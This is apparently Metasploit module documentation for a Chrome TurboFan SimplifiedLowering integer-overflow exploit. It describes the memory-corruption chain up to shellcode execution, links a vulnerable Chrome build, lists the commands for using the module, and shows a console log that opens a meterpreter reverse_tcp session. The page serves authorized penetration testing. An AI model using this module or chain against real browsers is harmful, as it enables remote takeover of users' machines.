## Vulnerable Application

This module exploits an issue in Google Chrome versions before 87.0.4280.88 (64 bit).
The exploit makes use of an integer overflow in the SimplifiedLowering phase in turbofan.
It is used along with a typer hardening bypass using ArrayPrototypeShift to create a JSArray with a length of -1.
This is abused to gain arbitrary read/write into the isolate region.
Then an ArrayBuffer can be used to achieve absolute arbitrary read/write.
The exploit then uses WebAssembly in order to allocate a region of RWX memory, which is then replaced with the payload shellcode.

**The payload is executed within the sandboxed renderer process,
so the browser must be run with the --no-sandbox option for the payload to work correctly.**

The module is compatible with any 64bit Google Chrome (versions before 87.0.4280.88) on multiple platforms.
However, the code that writes the shellcode into the rwx region (wasm_rwx_addr) may need to be modified.

**Vulnerable Application Installation Steps**

You can download a vulnerable Chrome version from this location:
[https://chromium.cypress.io/win64/stable/87.0.4280.66](https://chromium.cypress.io/win64/stable/87.0.4280.66)

## Verification Steps

1. Do: `use exploit/multi/browser/chrome_simplifiedlowering_overflow`
2. Do: `set URIPATH / [PATH]`
3. Do: `set LHOST [IP]`
4. Do: `set SRVHOST [IP]`
5. Do: `exploit`

## Options
None

## Scenarios

### Windows 10 and Google Chrome 87.0.4280.66 with --no-sandbox

Start Google Chrome without a sandbox, e.g:
`"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" --no-sandbox`

```
msf5 > use exploit/multi/browser/chrome_simplifiedlowering_overflow
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf5 exploit(multi/browser/chrome_simplifiedlowering_overflow) > set srvport 80
srvport => 80
msf5 exploit(multi/browser/chrome_simplifiedlowering_overflow) > set uripath /
uripath => /
msf5 exploit(multi/browser/chrome_simplifiedlowering_overflow) > set srvhost 127.0.0.1
srvhost => 127.0.0.1
msf5 exploit(multi/browser/chrome_simplifiedlowering_overflow) > set lhost 127.0.0.1
lhost => 127.0.0.1
msf5 exploit(multi/browser/chrome_simplifiedlowering_overflow) > run
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
[*] Started reverse TCP handler on 127.0.0.1:4444 
msf5 exploit(multi/browser/chrome) > [*] Using URL: http://127.0.0.1:80/
[*] Server started.
[*] 127.0.0.1        chrome_simplifiedlowering_overflow - Sending /index.html to Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36
[*] Sending stage (3012516 bytes) to 127.0.0.1
[*] Meterpreter session 1 opened (127.0.0.1:4444 -> 127.0.0.1:44046) at 2021-04-06 16:33:05 +0530

msf5 exploit(multi/browser/chrome_simplifiedlowering_overflow) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > 
```
